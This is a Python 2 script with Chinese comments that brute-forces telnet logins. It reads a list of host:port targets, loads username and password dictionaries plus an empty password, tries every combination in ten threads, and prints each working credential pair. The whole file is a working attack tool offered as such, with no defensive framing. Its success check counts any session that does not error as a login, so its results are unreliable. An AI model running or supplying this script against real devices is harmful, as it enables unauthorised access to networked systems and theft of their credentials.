#!/usr/bin/env python
# -*- coding: utf-8 -*-
import telnetlib
import sys
import socket

USER_DIC_ARR = []
PASSWD_DIC_ARR = []
# 懒爆破只爆破一个后retun,避免因为空密码，造成任意密码刷屏
LAZY_EXPOLDE = False

def getUserDic():
    global USER_DIC_ARR
    return USER_DIC_ARR

def getPasswdDic():
    global PASSWD_DIC_ARR
    return PASSWD_DIC_ARR

def connnetTotelnet(host,port,username,password):
    try:
        tn = telnetlib.Telnet(host=host,port=port,timeout=10)
        tn.set_debuglevel(2)
        tn.read_until("\n")
        tn.write(username.encode('ascii') + "\r\n".encode('ascii'))
        tn.read_until("\n")
        tn.write(password.encode('ascii') + "\r\n".encode('ascii'))
        tn.read_all()
        return True
    except:
        return False

def connectToHp(host,port):
    #查看是不是主机和port不能连接
    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sk.settimeout(10)
    try:
        sk.connect((host,port))
        sk.close()
        return True
    except Exception:
        print "\33[34mbad connection to "+host+':'+str(port)+'\33[37m'
        return False

def explode(host,port,dic):
    # port 这里是int类型
    usernameDic = dic['username']
    passwordDic = dic['password']
    #查看是不是主机和port不能连接
    if not connectToHp(host,port):
        return
    for username in usernameDic:
        for password in passwordDic:
            if connnetTotelnet(host,port,username,password):
                print '\33[33m'+host+':telnet\t'+'username:'+username+'\tpassword:'+password+'\33[37m'
                if LAZY_EXPOLDE:
                    return

def explodeListHp(hp):
    print 'telneter start explode '+hp+'\n'
    host = hp.split(':')[0]
    port = int(hp.split(':')[1])
    userDic = getUserDic()
    passwdDic = getPasswdDic()
    #查看是不是主机和port不能连接
    if not connectToHp(host,port):
        return
    for username in userDic:
        for password in passwdDic:
            if connnetTotelnet(host,port,username,password):
                print '\33[33m'+host+':telnet\t'+'username:'+username+'\tpassword:'+password+'\33[37m'
                if LAZY_EXPOLDE:
                    return


if __name__ == '__main__':
    if len(sys.argv)!=2:
        print "please indicate the file path"
        sys.exit(2)
    file_path = sys.argv[1]
    hpArr = []
    try:
        f = open(file_path,'r')
        for hp in f.readlines():
            hpArr.append(hp.strip('\n'))
        f.close()
    except:
        print "file path ill legal"
        sys.exit(2)
    #加载字典
    f = open('../dict/telnet_u.dic')
    for line in f.readlines():
        USER_DIC_ARR.append(line.strip('\n'))
    f.close()
    f = open('../dict/telnet_p.dic')
    for line in f.readlines():
        PASSWD_DIC_ARR.append(line.strip('\n'))
    PASSWD_DIC_ARR.append('')
    f.close()
    #多线程爆破telnet
    import threadpool
    pool = threadpool.ThreadPool(10)
    requests = threadpool.makeRequests(explodeListHp, hpArr)
    [pool.putRequest(req) for req in requests]
    pool.wait()
    pool.dismissWorkers(10, do_join=True)
